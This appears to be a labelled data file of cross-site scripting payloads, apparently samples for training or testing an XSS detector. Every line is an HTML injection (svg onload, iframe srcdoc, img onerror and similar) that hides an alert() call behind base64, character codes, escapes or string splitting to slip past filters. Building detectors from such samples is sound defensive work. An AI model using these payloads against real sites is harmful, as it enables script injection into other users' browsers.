"<iframe srcdoc=""<svg onload=(function(){window['ale'+'rt'](7)})()>""></iframe>",1
<svg onload=eval(atob(`YWxlcnQoMSk=`))>,1
"<iframe srcdoc='<svg><script>window[""al""+""ert""](""XSS"")</script></svg>'></iframe>",1
<svg onload=Function('al'+'ert(14)')()>,1
"<svg onload=eval('wind'+'ow[""al""+""ert""](123)')>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQ='))(1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>""></iframe>",1
<details open ontoggle=eval(atob('YWxlcnQoNyk='))>,1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>",1
"<svg onload='eval(atob(""YWxlcnQoJzEwMCcp""))'>",1
<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>,1
<svg onload=eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))>,1
"<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9c2V0VGltZW91dCgnYWxlcnQoMSknKTs+""></object>",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))"">",1
"<svg onload=""window['al'+'ert'](String.raw`1`)"">",1
<svg onload=window['\x61\x6c\x65\x72\x74'](`\x31`)>,1
"<svg onload=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)>""></iframe>",1
"<svg onload='new Function(""return al""+""ert(1)"")()'></svg>",1
<svg onload=eval(decodeURIComponent('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>,1
"<iframe srcdoc=""<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>"">",1
"<iframe srcdoc=""<svg onload=window['a'+'ler'+'t'](1)>"">",1
<svg/onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>,1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('decodeURIComponent(escape(unescape(\\u0061\\u006c\\u0065\\u0072\\u0074(1))))')>""></iframe>",1
"<svg onload=""window['al'+'ert'](1)"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ale'+'rt'](14)>""></iframe>",1
"<svg onload=""let x = this.constructor; x.constructor('alert\u00281\u0029')()"">",1
"<iframe srcdoc=""<svg onload=top['a'+'l'+'ert']('XSS')>"">",1
"<iframe src=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[unescape('%61%6C%65%72%74')](1)>""></iframe>",1
<svg onload=top['ale\x72t'](1)>,1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",1
"<iframe srcdoc=""<script>window['al'+'ert'](0b1)</script>"">",1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.domain)')>,1
